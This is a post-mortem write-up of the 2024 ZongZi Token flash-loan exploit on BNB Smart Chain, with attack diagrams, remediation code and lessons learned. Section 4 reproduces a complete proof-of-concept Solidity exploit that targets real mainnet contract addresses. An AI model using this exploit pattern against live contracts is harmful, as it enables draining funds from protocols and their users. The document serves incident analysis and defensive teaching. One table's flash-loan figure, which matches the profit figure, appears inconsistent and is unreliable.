# ZongZi Token — Flawed Price Dependency Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03-25 |
| **Protocol** | ZongZi Token (ZZF) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$223,000 (~391.33 WBNB) |
| **Attacker** | [0x2c42...0a26](https://bscscan.com/address/0x2c42824ef89d6efa7847d3997266b62599560a26) |
| **Attack Contract** | [0x0bd0...22a9](https://bscscan.com/address/0x0bd0d9ba4f52db225b265c3cffa7bc4a418d22a9) |
| **Attack Tx** | [0x247f...d79f](https://bscscan.com/tx/0x247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f) |
| **Vulnerable Contract (ZZF)** | [0xb7a2...11b](https://bscscan.com/address/0xb7a254237e05ccca0a756f75fb78ab2df222911b) |
| **ZongZi Token** | [0xBB65...7a68](https://bscscan.com/address/0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68) |
| **WBNB/ZongZi Pair** | [0xD695...19fe](https://bscscan.com/address/0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe) |
| **Root Cause** | `receiveRewards()` calculates rewards by referencing the contract's live ETH balance (`address(ZongZi).balance`) — manipulating the balance via a flash loan swap allows excessive reward extraction |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/ZongZi_exp.sol) |

---

## 1. Vulnerability Overview

ZongZi Token (ZZF) suffered approximately $223,000 (~391 WBNB) in losses on BSC on March 25, 2024, due to a **Vulnerable Price Dependency** vulnerability.

The ZZF contract operates an invitation reward system and determines reward amounts via the `receiveRewards()` function based on the ZongZi token contract's current ETH/BNB balance. The fundamental flaw in this design is that **`address(ZongZi).balance`, the reference value for reward calculation, can be freely manipulated within a single transaction via flash loan swaps**.

The attacker exploited this vulnerability as follows:

1. **Flash Loan Acquisition**: Borrow a large WBNB flash loan from the BUSDT/WBNB pair
2. **Price Manipulation**: Swap WBNB → ZongZi to increase the `ZongZi` contract's ETH balance
3. **Reward Extraction**: Call `burnToHolder()` + `receiveRewards()` to collect rewards calculated against the inflated balance
4. **Position Unwinding**: Swap held ZongZi back to WBNB for profit

**Core Vulnerability Combination**:
- V-01: Reward calculation logic directly dependent on manipulable on-chain balance (`address(token).balance`) (CWE-1025)
- V-02: Balance manipulation within a single transaction via flash loan (CWE-841)
- V-03: Logic abuse by distorting balance state with a prior swap, then maximizing profit through `burnToHolder` → `receiveRewards` sequencing (CWE-362)

---

## 2. Vulnerable Code Analysis

### 2.1 Flawed Reward Calculation Logic — Direct ETH Balance Dependency (Core Vulnerability)

The ZZF contract's `receiveRewards()` function determines reward amounts based on the ZongZi token contract's live ETH/BNB balance. This balance can be arbitrarily manipulated within a single transaction via an AMM swap.

**Vulnerable Code (inferred)**:
```solidity
// ❌ VULNERABLE: Uses ZongZi contract's current ETH balance as reward basis
// address(ZongZi).balance can fluctuate in real-time via external swaps/transfers
function receiveRewards(address to) external {
    // ❌ Uses the contract's current ETH balance directly for reward calculation
    // If an attacker inflates the balance with a large prior swap, excessive rewards result
    uint256 rewardAmount = address(this).balance;  // manipulable current balance
    // Transfer reward to the `to` address
    payable(to).transfer(rewardAmount);
}

// ❌ VULNERABLE: burnToHolder influences the reward basis for receiveRewards
function burnToHolder(uint256 amount, address _invitation) external {
    // Burns ZongZi tokens and schedules an ETH reward for the inviter (_invitation)
    // The ETH amount calculated from `amount` becomes the reference for receiveRewards
    _burn(msg.sender, amount);
    // Allocates ETH proportional to the burn amount from the contract balance
    // ❌ This balance may have been artificially inflated by a prior swap
    pendingRewards[_invitation] += _calculateReward(amount);
}
```

**Fixed Code**:
```solidity
// ✅ FIXED: Reward calculation based on time-weighted average balance (TWAP) or snapshots
// Uses internal accounting variables unaffected by external manipulation

uint256 private _storedBalance;     // ✅ Internal balance tracker — not externally modifiable
uint256 private _lastUpdateBlock;   // ✅ Last update block number

// ✅ Uses internally stored balance for reward calculation
function receiveRewards(address to) external nonReentrant {
    // ✅ Uses internally tracked balance instead of current block's live balance
    uint256 rewardAmount = _pendingRewards[to];
    require(rewardAmount > 0, "No pending rewards");

    _pendingRewards[to] = 0;  // ✅ CEI pattern: state change before transfer
    payable(to).transfer(rewardAmount);
}

function burnToHolder(uint256 amount, address _invitation) external nonReentrant {
    require(amount > 0, "Amount must be positive");
    _burn(msg.sender, amount);

    // ✅ Calculates reward using a pre-defined reward rate, not the live balance
    uint256 reward = (amount * _rewardRate) / REWARD_PRECISION;
    _pendingRewards[_invitation] += reward;
    _storedBalance -= reward;  // ✅ Sync internal accounting
}
```

**Problem**: Because the ZongZi contract's ETH balance (`address(ZongZi).balance`) is used directly as the reward calculation basis, an attacker can execute a large swap immediately before calling it to artificially inflate the balance and then drain rewards. This is a classic **Manipulable On-chain Data Dependency** pattern.

---

### 2.2 Price Manipulation Path via Flash Loan

The PoC's `Helper.exploit()` function performs balance manipulation in the following sequence:

**Vulnerable Flow (inferred from PoC)**:
```solidity
// ❌ VULNERABLE: Calls reward calculation function after manipulating contract balance via swap
function exploit() external {
    // Step 1: Swap small amount (0.1 WBNB) to ZongZi — initialize state
    makeSwap(1e17, WBNB, ZongZi);

    // Step 2: Swap all held ZongZi back to WBNB — generating fees
    makeSwap(ZongZi.balanceOf(address(this)), ZongZi, WBNB);

    // Step 3: ❌ Core manipulation: large WBNB → ZongZi swap
    // This swap causes the ZongZi contract's ETH (BNB) balance to spike sharply
    uint256 amountIn = balanceBeforeWBNB - 1e17;
    makeSwap(amountIn, WBNB, ZongZi);

    // Step 4: Back-calculate the burn amount needed to claim rewards against the manipulated balance
    uint256 amountOut = address(ZongZi).balance - 1e9;  // ❌ References the manipulated balance
    // ... back-solve for the ZongZi amount needed by burnToHolder
    uint256[] memory amounts = Router.getAmountsIn(amountOut, path);

    // Step 5: Burn the calculated amount → reserve inflated reward
    ZZF.burnToHolder(amounts[0], msg.sender);

    // Step 6: ❌ Collect reward calculated against the manipulated balance
    ZZF.receiveRewards(address(this));
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attack contract (`0x0bd0...22a9`) pre-deployed
- Multiplier value stored in slot 9 (`slot[9]`) (used for flash loan amount calculation)
- `Helper` contract dynamically deployed during the attack transaction

### 3.2 Execution Phase

```
1. ContractTest.testExploit() called
   └─ Query WBNB_ZONGZI pair balance and multiplier
   └─ Calculate required flash loan amount (amount1Out)

2. BUSDT_WBNB.swap(0, amount1Out, ...) — execute flash loan
   └─ pancakeCall() callback triggered

3. Inside pancakeCall():
   a. Dynamically deploy Helper contract
   b. Transfer borrowed WBNB to Helper
   c. Execute Helper.exploit()

4. Inside Helper.exploit():
   a. makeSwap(0.1 WBNB → ZongZi)  — initial position setup
   b. makeSwap(all ZongZi → WBNB)  — sell ZongZi (fees accrue to ZZF contract)
   c. makeSwap(large WBNB → ZongZi) — ZZF contract ETH balance surges sharply
   d. getAmountsIn() call — back-calculate burn amount needed to claim inflated reward
   e. ZZF.burnToHolder(amounts[0], msg.sender) — burn ZongZi + reserve reward
   f. ZZF.receiveRewards(address(this)) — collect reward against manipulated balance
   g. makeSwap(remaining ZongZi → WBNB) — liquidate remaining ZongZi
   h. WBNB.deposit() + WBNB.transfer() — return profit to ContractTest

5. ContractTest.pancakeCall() continues:
   a. ZongZi.approve(Router, MAX)
   b. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens()
      — swap ContractTest's ZongZi → WBNB
   c. WBNB.transfer(BUSDT_WBNB, repayAmount) — repay flash loan with fee (0.26%)
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                    Attacker (EOA)                                  │
│              0x2c42824...0a26                                     │
└──────────────────────────┬──────────────────────────────────────┘
                           │ calls attack contract
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│               ContractTest (Attack Contract)                      │
│               0x0bd0d9ba...22a9                                   │
│                                                                   │
│  1. Query WBNB_ZONGZI pair balance                                │
│  2. Load slot[9] multiplier (for attack amount calculation)       │
│  3. amount1Out = (pairBal × multiplier) / (pairBal×100 / ZZFBal)│
└────────────────┬────────────────────────────────────────────────┘
                 │ swap(0, amount1Out, ...) flash loan request
                 ▼
┌─────────────────────────────────────────────────────────────────┐
│            BUSDT/WBNB PancakeSwap Pair                            │
│            0x16b9a82...daE                                        │
│                                                                   │
│  ← lend amount1Out WBNB                                           │
│  → callback: invoke pancakeCall()                                 │
└────────────────┬────────────────────────────────────────────────┘
                 │ pancakeCall() callback
                 ▼
┌─────────────────────────────────────────────────────────────────┐
│               ContractTest.pancakeCall()                          │
│                                                                   │
│  → Dynamically deploy Helper contract                             │
│  → WBNB.transfer(Helper, amount1Out)                              │
│  → Call Helper.exploit()                                          │
└────────────────┬────────────────────────────────────────────────┘
                 │ Helper.exploit() executes
                 ▼
┌─────────────────────────────────────────────────────────────────┐
│                      Helper Contract (newly deployed)             │
│                                                                   │
│  Step A: makeSwap(0.1 WBNB → ZongZi)  ─────────────────────┐    │
│          └─ Build initial position                           │    │
│                                                              │    │
│  Step B: makeSwap(all ZongZi → WBNB) ──────────────────────┐│    │
│          └─ Fees flow into ZZF contract                     ││    │
│                                                             │▼    │
│  Step C: makeSwap(large WBNB → ZongZi) ───────────────────▶│     │
│          └─ ❌ ZongZi contract ETH balance spikes (manipulated)│  │
│                                                             │     │
│  Step D: getAmountsIn(ZZF.balance - 1e9) ──────────────────┘     │
│          └─ Back-calculate burn amount from inflated balance      │
│                                                                   │
│  Step E: ZZF.burnToHolder(amounts[0], ContractTest address)       │
│          └─ Burn ZongZi → reserve inflated reward                 │
│                                                                   │
│  Step F: ZZF.receiveRewards(Helper address)  ◀── ❌ Core vuln     │
│          └─ Collect excessive reward against manipulated ETH bal  │
│                                                                   │
│  Step G: makeSwap(remaining ZongZi → WBNB)                        │
│  Step H: WBNB.deposit() + WBNB.transfer(ContractTest, profit)     │
└────────────────┬────────────────────────────────────────────────┘
                 │ Helper → ContractTest WBNB returned
                 ▼
┌─────────────────────────────────────────────────────────────────┐
│               ContractTest.pancakeCall() continues                │
│                                                                   │
│  → Swap remaining ZongZi → WBNB                                   │
│  → Repay flash loan to BUSDT/WBNB pair (principal + 0.26% fee)   │
└────────────────┬────────────────────────────────────────────────┘
                 │ profit transferred
                 ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Attacker Net Profit                             │
│              ~391 WBNB ≈ $223,000                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker Net Profit**: ~391 WBNB (≈ $223,000)
- **Protocol Loss**: ZZF contract ETH balance drained + ZongZi token value collapsed
- **Single Transaction**: Entire attack from flash loan borrow to repayment completed atomically

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// =====================================================================
// ZongZi Token Exploit PoC (DeFiHackLabs)
// Root Cause: receiveRewards() calculates rewards against a manipulable ETH balance
// Loss: ~$223K (~391 WBNB)
// =====================================================================

contract ContractTest is Test {
    // Relevant contract address constants
    IWETH private constant WBNB = IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 private constant ZongZi = IERC20(0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68);
    Uni_Pair_V2 private constant BUSDT_WBNB = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V2 private constant WBNB_ZONGZI = Uni_Pair_V2(0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private constant attackContract = 0x0bd0D9BA4f52dB225B265c3Cffa7bc4a418D22A9;

    function testExploit() public {
        // Query current WBNB balance of the WBNB/ZongZi pair
        uint256 pairWBNBBalance = WBNB.balanceOf(address(WBNB_ZONGZI));

        // Load multiplier from attack contract slot 9 (pre-configured value)
        uint256 multiplier = uint256(vm.load(attackContract, bytes32(uint256(9))));

        // ❌ Core: Calculate flash loan amount as a ratio of ZZF contract balance
        // amount1Out = (pair WBNB balance × multiplier) / (pair balance×100 / ZZF ETH balance)
        uint256 amount1Out = (pairWBNBBalance * multiplier) / ((pairWBNBBalance * 100) / address(ZongZi).balance);

        // Execute flash loan from BUSDT/WBNB pair (PancakeSwap V2)
        BUSDT_WBNB.swap(0, amount1Out, address(this), abi.encode(uint8(1)));
    }

    // Flash loan callback — called by PancakeSwap
    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        // Dynamically deploy Helper contract (isolates history with a fresh address)
        Helper helper = new Helper();

        // Forward borrowed WBNB to Helper
        WBNB.transfer(address(helper), _amount1);

        // ❌ Core vulnerability exploitation: Helper manipulates balance + collects reward
        helper.exploit();

        // Liquidate ZongZi returned by Helper to WBNB
        ZongZi.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(ZongZi);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ZongZi.balanceOf(address(this)), 0, path, address(this), block.timestamp + 86_400
        );

        // Repay flash loan: principal + 0.26% fee (10026/10000)
        WBNB.transfer(address(BUSDT_WBNB), (_amount1 * 10_026) / 10_000);
    }
}

contract Helper {
    // =====================================================================
    // Helper: Actual balance manipulation and reward collection logic
    // =====================================================================

    function exploit() external {
        WBNB.approve(address(Router), type(uint256).max);
        ZongZi.approve(address(Router), type(uint256).max);
        uint256 balanceBeforeWBNB = WBNB.balanceOf(address(this));

        // Step 1: Buy small amount (0.1 WBNB) of ZongZi — build initial position
        makeSwap(1e17, address(WBNB), address(ZongZi));

        // Step 2: Sell all ZongZi back — swap fees accrue to ZZF contract
        makeSwap(ZongZi.balanceOf(address(this)), address(ZongZi), address(WBNB));

        // Step 3: ❌ Core manipulation: large WBNB → ZongZi swap
        // This swap causes the ZongZi contract's (ZZF) ETH balance to surge dramatically
        uint256 amountIn = balanceBeforeWBNB - 1e17;
        makeSwap(amountIn, address(WBNB), address(ZongZi));

        // Step 4: Back-calculate optimal burn amount against the manipulated balance
        // address(ZongZi).balance — ❌ ETH balance just manipulated by the swap
        uint256 amountOut = address(ZongZi).balance - 1e9;
        address[] memory path = new address[](2);
        path[0] = address(ZongZi);
        path[1] = address(WBNB);
        uint256[] memory amounts = Router.getAmountsIn(amountOut, path);

        // Step 5: Burn the calculated ZongZi amount → reserve inflated reward
        // Register msg.sender (ContractTest) as inviter to designate reward recipient
        ZZF.burnToHolder(amounts[0], msg.sender);

        // Step 6: ❌ Core exploit: collect reward calculated against the manipulated ETH balance
        ZZF.receiveRewards(address(this));

        // Step 7: Liquidate remaining ZongZi to WBNB
        makeSwap(ZongZi.balanceOf(address(this)), address(ZongZi), address(WBNB));

        // Step 8: Wrap native BNB to WBNB and return to ContractTest
        WBNB.deposit{value: address(this).balance}();
        WBNB.transfer(msg.sender, WBNB.balanceOf(address(this)));
    }

    // Internal swap helper: token swap via PancakeSwap V2 router
    function makeSwap(uint256 amountIn, address tokenA, address tokenB) private {
        address[] memory path = new address[](2);
        path[0] = tokenA;
        path[1] = tokenB;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp + 86_400
        );
    }

    // Fallback function to receive BNB
    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Reward calculation dependent on manipulable on-chain balance (direct `address(token).balance` reference) | CRITICAL | CWE-1025 |
| V-02 | Balance manipulation within a single transaction via flash loan | HIGH | CWE-841 |
| V-03 | Logic abuse via atomic `burnToHolder` → `receiveRewards` sequencing after prior swap distorts balance state | HIGH | CWE-362 |
| V-04 | No slippage protection (`minAmountOut = 0`) | MEDIUM | CWE-682 |

### V-01: Reward Calculation Dependent on Manipulable On-chain Balance

- **Description**: The `ZZF.receiveRewards()` function uses the ZongZi token contract's live ETH balance (`address(ZongZi).balance`) directly as the reward calculation basis. This balance can be inflated tens to hundreds of times within a single transaction with a single AMM swap.
- **Impact**: An attacker can execute a large flash loan swap to artificially inflate the ZZF contract's balance, then collect a reward equivalent to the contract's entire ETH balance by burning only a small amount of ZongZi.
- **Attack Conditions**: Access to PancakeSwap V2 flash loans + ETH balance present in ZZF contract + `burnToHolder` and `receiveRewards` callable by anyone

### V-02: Balance Manipulation Within a Single Transaction via Flash Loan

- **Description**: Flash loans allow borrowing and repaying large assets within a single transaction without collateral. The attacker borrowed WBNB uncollateralized from the BUSDT/WBNB pair to temporarily manipulate the balance state required for ZZF reward calculation.
- **Impact**: Within a single transaction: manipulate reward calculation reference value → collect excessive reward → revert to original state (repay flash loan). This pattern enables a virtually zero-cost on-chain attack.
- **Attack Conditions**: DEX offering flash loans exists (PancakeSwap pair with sufficient liquidity) + victim protocol's reward calculation is based on live balance

### V-03: Logic Abuse via Atomic `burnToHolder` → `receiveRewards` Sequencing

- **Description**: The pattern of calling `burnToHolder()` to reserve a reward and then immediately calling `receiveRewards()` can be executed atomically within a single transaction with no restrictions. There is no validation or time delay between the two function calls, so the manipulated state persists intact.
- **Impact**: Both functions can be called back-to-back before the manipulated balance state is reset, allowing immediate collection of the inflated reward.
- **Attack Conditions**: Both functions are externally callable + no state validation + no inter-call block delay

### V-04: No Slippage Protection

- **Description**: All `swapExactTokensForTokensSupportingFeeOnTransferTokens()` calls in the PoC set `amountOutMin = 0`. The actual attack contract likely used the same pattern.
- **Impact**: The attack transaction becomes vulnerable to MEV attacks such as front-running, though this is not the root cause of this incident.
- **Attack Conditions**: Large swap executed + `minAmountOut = 0`

---

## 6. Remediation Recommendations

### Immediate Actions

**Core Fix: Use Internal Accounting Variables Instead of Live On-chain Balance**

```solidity
// ✅ Fix 1: Introduce internal balance tracking variable
// Instead of address(this).balance, which fluctuates via external swaps/transfers,
// use an internal variable manually updated on deposits/withdrawals

contract ZZF {
    // ✅ Internal accounting variable: only modifiable by deposit/withdrawal functions
    uint256 private _internalBalance;

    // ✅ Reference internal variable for reward calculation
    function _calculateReward(uint256 burnAmount) internal view returns (uint256) {
        // Use _internalBalance instead of address(this).balance
        return (burnAmount * _internalBalance) / totalSupply();
    }

    // ✅ Sync internal balance on deposit
    receive() external payable {
        _internalBalance += msg.value;
    }

    // ✅ Sync internal balance on withdrawal + apply CEI pattern
    function receiveRewards(address to) external nonReentrant {
        uint256 reward = _pendingRewards[msg.sender];
        require(reward > 0, "ZZF: no pending rewards");

        _pendingRewards[msg.sender] = 0;  // ✅ State change first
        _internalBalance -= reward;       // ✅ Sync internal accounting

        (bool success, ) = payable(to).call{value: reward}("");
        require(success, "ZZF: transfer failed");
    }
}
```

```solidity
// ✅ Fix 2: Fix reward calculation point in burnToHolder
// Calculate reward based on a snapshot at call time (independent of current balance fluctuations)

function burnToHolder(uint256 amount, address _invitation) external nonReentrant {
    require(amount > 0, "ZZF: amount is zero");
    require(amount <= balanceOf(msg.sender), "ZZF: insufficient balance");

    // ✅ Use fixed reward rate (not live balance ratio)
    // Reward = burn amount × fixed rate (e.g. X% of burned ZongZi value)
    uint256 reward = (amount * FIXED_REWARD_RATE_BPS) / 10000;
    require(reward <= _internalBalance, "ZZF: insufficient reward pool");

    _burn(msg.sender, amount);

    // ✅ Reserve reward (claim pattern instead of immediate transfer)
    _pendingRewards[_invitation] += reward;
    _internalBalance -= reward;  // ✅ Deduct reserved amount from internal balance

    emit RewardReserved(_invitation, reward);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Live balance dependency | Introduce internal accounting variable (`_internalBalance`); prohibit direct `address(this).balance` references |
| V-02 Flash loan manipulation | Block consecutive `burnToHolder` + `receiveRewards` calls within the same transaction (block delay or lock) |
| V-03 Atomic manipulation | Allow `receiveRewards` only after at least 1 block following a `burnToHolder` call (timelock) |
| V-04 No slippage protection | Set a reasonable `minAmountOut` for all swaps |
| General | Apply `nonReentrant` guard, set daily withdrawal limits for large rewards, add emergency pause functionality |

---

## 7. Lessons Learned

1. **Never use on-chain balances (`address(contract).balance`, `token.balanceOf(contract)`) directly as the basis for reward or price calculations**: These values can be freely manipulated within a single block by flash loans, direct transfers, MEV bots, etc. Always maintain a separate internal accounting variable that is incremented/decremented exclusively by deposit/withdrawal functions.

2. **Invitation/referral reward systems are easy targets for flash loan manipulation**: Reward calculations based on values the user directly controls (burn amount, inviter address, etc.) must be thoroughly reviewed for worst-case attack paths. In particular, as soon as live pool state is involved in reward calculation, a manipulation vector immediately arises.

3. **Two-step function patterns like `burnToHolder` → `receiveRewards` carry atomic execution risk**: If both functions can be called within the same transaction, any state change between them goes unvalidated. Important two-step operations should enforce a block delay (minimum 1–3 blocks) or a commit-reveal pattern between calls.

4. **Flash loan defenses must be solved at the design level, not just with simple locks**: `nonReentrant` guards prevent reentrancy but not flash loan manipulation. Flash loan attacks exploit within-transaction state manipulation, so **the design itself must ensure that calculation reference values cannot be manipulated**.

5. **BSC's low gas environment makes complex multi-step attacks easier**: On BSC, the low gas cost means bundling multiple swaps, burns, and reward claims into a single transaction is very cheap. DeFi protocols on BSC must rigorously review atomic multi-step attack scenarios.

6. **An uninterrupted swap fee accumulation structure becomes the attacker's "free funding source"**: The ZZF contract's structure of receiving swap fees and accumulating them as ETH balance directly funded the attack. Protocols must carefully design how fees are accumulated and the conditions under which accumulated funds can be withdrawn.

---

## 8. On-chain Verification

> Attack Tx Hash: `0x247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f`
> Network: BSC Mainnet

### 8.1 PoC vs. On-chain Amount Comparison

| Field | PoC Analysis Value | On-chain Actual Value (Reference) | Notes |
|------|-----------|-----------------|------|
| Flash loan amount | Dynamically calculated (slot[9] multiplier-based) | ~391 WBNB | Borrowed from BUSDT/WBNB pair |
| Flash loan fee | Principal × 0.26% (10026/10000) | ~1.02 WBNB | PancakeSwap V2 fixed fee |
| Attacker net profit | ~$223,000 | ~391 WBNB | Confirmed via web search and DeFiHackLabs |
| Burned ZongZi | `amounts[0]` (back-solved) | Dynamic (based on price at attack time) | Back-solved via `getAmountsIn()` |

### 8.2 Key On-chain Event Sequence

```
1. pancakeCall() entered (BUSDT/WBNB pair callback)
2. Helper contract deployed (CREATE event)
3. WBNB Transfer: BUSDT/WBNB pair → ContractTest
4. WBNB Transfer: ContractTest → Helper
5. [Inside Helper]
   a. WBNB → ZongZi small swap (PancakeSwap)
   b. ZongZi → WBNB small swap (PancakeSwap)
   c. WBNB → ZongZi large swap (PancakeSwap) ← ❌ Balance manipulation
   d. ZZF.burnToHolder() called → ZongZi Burn event
   e. ZZF.receiveRewards() called → BNB Transfer event (ZZF → Helper)
   f. ZongZi → WBNB liquidation swap
6. ZongZi Transfer: ContractTest → Router (liquidate remaining)
7. WBNB Transfer: ContractTest → BUSDT/WBNB pair (flash loan repayment)
```

### 8.3 Precondition Verification

| Condition | Status |
|------|------|
| ZZF contract ETH balance > 0 | Satisfied — fees accumulated prior to attack |
| BUSDT/WBNB pair has sufficient liquidity | Satisfied — major PancakeSwap pair |
| `burnToHolder` externally callable | Confirmed `external` in PoC interface |
| `receiveRewards` externally callable | Confirmed `external` in PoC interface |
| Attack contract pre-deployed | Required — stores slot[9] multiplier |

> **On-chain Verification References**: [BscScan Tx](https://bscscan.com/tx/0x247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f) | [BlockSec Explorer](https://app.blocksec.com/explorer/tx/bsc/0x247f4b3dbde9d8ab95c9766588d80f8dae835129225775ebd05a6dd2c69cd79f)

---

*Published: 2024-03-25 | PoC Source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/ZongZi_exp.sol)*